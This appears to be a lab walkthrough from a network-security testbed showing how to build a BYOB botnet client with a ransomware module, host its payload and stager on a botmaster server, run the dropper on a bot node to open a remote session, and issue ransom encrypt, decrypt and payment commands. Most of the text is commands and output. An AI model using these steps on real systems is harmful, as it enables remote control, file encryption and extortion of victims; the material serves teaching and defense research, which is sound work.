## Ransomware Attack
The data is encrypted through a ransomware by botmaster (`botmaster` in our case) and the files can only be seen if decrypted from bot nodes (`b1` in our case).

### Connection with client

We will use the `botmaster` node to generate a client. The client will have a ransomware module built into it.

SSH to the botmaster node from your XDC
```shell
ssh botmaster
```

```shell
cd /opt/byob/byob.git/byob
python3 client.py --freeze botmaster.infra 1337 ransom
```
The output should look like this:

```shell


88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'


[>] Modules
        Adding modules...  -[-] can't add module: 'ransom' (does not exist)
(4 modules added to client)

[>] Imports
        Adding imports...-(32 imports from 4 modules)

[>] Payload
        Uploading payload...  -(hosting payload at: http://botmaster.infra:1338/clients/payloads/jIJ.py)

[>] Stager
        Uploading stager... -(hosting stager at: http://botmaster.infra:1338/clients/stagers/jIJ.py)

[>] Dropper
        Writing dropper...  (355 bytes written to /modules/clients/droppers/byob_jIJ.py)
        Compiling executable...
91 INFO: PyInstaller: 6.4.0, contrib hooks: 2024.1
91 INFO: Python: 3.9.2
.
.
.
19652 INFO: Appending PKG archive to custom ELF section in EXE
19714 INFO: Building EXE from EXE-00.toc completed successfully.
(22,541,192 bytes saved to file: /opt/byob/byob/dist/jIJ)
```

We now scp this module to our home directory on the client (for example, `b1`):
```shell
scp dist/jIJ b1.infra:
```

Lastly, startup the server
```shell
python3 -u server.py
```
The server should start and should start a prompt as follows:

```shell
88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'


[?]  Hint: show usage information with the 'help' command

[rishitsaiya @ /opt/byob/byob]>
```

Parallely, SSH to the b1 node from your XDC through different terminal
```shell
ssh b1
```
Execute the payload from here
```shell
./jIJ
```

At this point, the server should display a message like:
```shell
[+] Connection: 172.30.0.11
    Session: 0
    Started: Wed Nov  8 20:34:50 2023
```

Connect with the bot node using
```shell
shell 0
```
You can verify the socket connection by typing `ls` at prompt in server to check.

#### Test Files Creation
For demo purposes I have made `test.txt`, `test_dir/` on `b1` node.

```shell
rishitsaiya@b1:~$ ls
jIJ test_dir test.txt

rishitsaiya@b1:~$ cd test_dir/
rishitsaiya@b1:~/test_dir$ ls
test.txt
rishitsaiya@b1:~/test_dir$ cat test.txt 
This is a test file.
```

#### Random Key Pair Generation
We are using the keys generated from CryptoTools [https://cryptotools.net/rsagen] with a 2048 key length.

Let us call the keys _pub_ & _priv_ for our case. 

Usage line in `ransom.py` [here](https://github.com/STEELISI/DISCERN/blob/6d8fb527022693f06ef40d387ac0989e2c8f3456/byob/byob/modules/ransom.py#L63)
```shell
usage = 'ransom <encrypt/decrypt/payment> <file_name> [pub key] [priv key]'
```

#### Available Ransom Commands
There are three commands through `byob` bot. They are as follows:
- **encrypt** - `encrypt` would essentially encrypt the files with a key pair
- **decrypt** - `decrypt` would essentially decrypt the files with a key pair
- **payment** - `payment` would notify the bot nodes that you are hacked

#### Encrypt Ransom Command Usage

The **encrypt** command usage is as follows:

On `botmaster` node where the server is running, a typical command would look like as follows:

A command should look like this
```shell
[ 0 @ /home/rishitsaiya ]>ransom encrypt test.txt MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...IDAQAB MIIEpQIBAAKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...+kCUsXHpgh8oE=
```
It shall output with a message as follows:
```shell
test.txt encrypted
```

Parallely, if you observe the content of `test.txt` at the `b1` node, it shall be as follows:
```shell
rishitsaiya@b1:~$ cat test.txt
0DK4odBrMiSkh5WAoLlj94NuaGfmKpCggPCvX2LkC7DchCQu9nEwhyLM+/Nup8zyFYgiJQ==r
```
#### Decrypt Ransom Command Usage

The **decrypt** command usage is as follows:

On `botmaster` node where the server is running, a typical command would look like as follows:

A command should look like this
```shell
[ 0 @ /home/rishitsaiya ]>ransom decrypt test.txt MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...IDAQAB MIIEpQIBAAKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...+kCUsXHpgh8oE=
```
It shall output with a message as follows:
```shell
Decrypting files
```

Parallely, if you observe the content of `test.txt` at the `b1` node, it shall be as follows:
```shell
rishitsaiya@b1:~$ cat test.txt
This is a test file.
```

#### Payment Ransom Command Usage
The **payment** command usage is as follows:

On `botmaster` node where the server is running, a typical command would look like as follows:

A command should look like this
```shell
[ 0 @ /home/rishitsaiya ]>ransom payment
```
It shall output with a message as follows:
```shell
Launched a Windows Message Box with ransom payment information
```
This message can be re-altered if required through [here](https://github.com/STEELISI/DISCERN/blob/01bf739c1d0e06a202b4bb83e136a243a6e23dba/byob/byob/modules/ransom.py#L195).

Parallely, if you observe the terminal where the payload is running on the `b1` node, there will be message printed there:
```shell
Hackers are here!
```
This message can be re-altered if required through [here](https://github.com/STEELISI/DISCERN/blob/01bf739c1d0e06a202b4bb83e136a243a6e23dba/byob/byob/modules/ransom.py#L191).